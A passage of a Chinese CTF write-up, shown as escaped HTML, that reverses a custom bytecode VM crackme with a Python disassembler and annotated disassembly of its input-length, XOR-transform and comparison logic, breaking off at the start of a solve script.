&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;20&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;mov [rbp+r2], r3&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;21&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;add r3, r3&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;接下来就是反汇编了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0D&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x15&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0E&lt;/span&gt;
]

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;disasm&lt;/span&gt;(i, c):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mov [3], [2]&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;inc [2]&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dec [2]&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xor [3], [7]&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;push [3]&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;push [5]&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;push [6]&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pop [3]&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pop [5]&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pop [6]&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pop [2]&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pop [7]&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;jz $+1+[6]&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;jnz $+1+[6]&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;jmp $+1+[2]&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cmp [3], [5]&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;getchar([3])&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;putchar([3])&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;push *(([4]++)+0xD1)&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mov [3], [rbp+[2]]&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mov [rbp+[2]], [3]&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;add [3], [3]&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;也许跟着 log 一起看比较好，这里就直接对着 data 里的数据看了&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;_00:    push 0x0A
_01:    pop [5]
_02:    push -5
_03:    pop [6]

_04:    getchar([3])
_05:    push [3]
_06:    inc [2]
_07:    cmp [3], [5]
_08:    jnz $+1+[6]
_09:    dec [2]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个 jnz 的循环是 &lt;code&gt;getchar()&lt;/code&gt; 直到读取到 &lt;code&gt;\n&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;接下来是个对长度做了限制&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;_0A:    push 0x20
_0B:    pop [5]
_0C:    push 0x2F
_0D:    pop [6]
_0E:    mov [3], [2]
_0F:    push [3]
_10:    cmp [3], [5]
_11:    jnz $+1+[6]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里先 add 自身，然后依次异或 data 中的数据（第一个是 0x5e）&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;_12:    push -10
_13:    pop [6]
_14:    push 0
_15:    pop [2]
_16:    mov [3], [rbp+[2]]
_17:    push 0x5e (next_mem)
_18:    pop [7]
_19:    add [3], [3]
_1A:    xor [3], [7]
_1B:    mov [rbp+[2]], [3]
_1C:    inc [2]
_1D:    mov [3], [2]
_1E:    cmp [3], [5]
_1F:    jnz $+1+[6]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;后面就是比较了，如果不相等就会直接从第一个 jnz 直接退出，否则会判断长度来看是否退出循环&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;_20:    push *(([4]++)+0xD1) ; 0
_21:    pop [2]
_22:    push *(([4]++)+0xD1) ; -17
_23:    push *(([4]++)+0xD1) ; 21

_24:    push *(([4]++)+0xD1) ; 142
_25:    pop [5] ; [5] = 142
_26:    mov [3], [rbp+[2]] ; [3]=142
_27:    cmp [3], [5] ; 0
_28:    pop [3]
_29:    push [3]
_2A:    pop [6] ; 21
_2B:    jnz $+1+[6]

_2C:    pop [6] ; -17
_2D:    pop [5]
_2E:    push [5]
_2F:    push [6]
_30:    push [3]
_31:    inc [2]
_32:    mov [3], [2]
_33:    cmp [3], [5]
_34:    jnz $+1+[6]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最后一段没有看了，&lt;code&gt;putchar()&lt;/code&gt; 显然是输出正确信息&lt;/p&gt;
&lt;p&gt;脚本&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; operator &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; xor


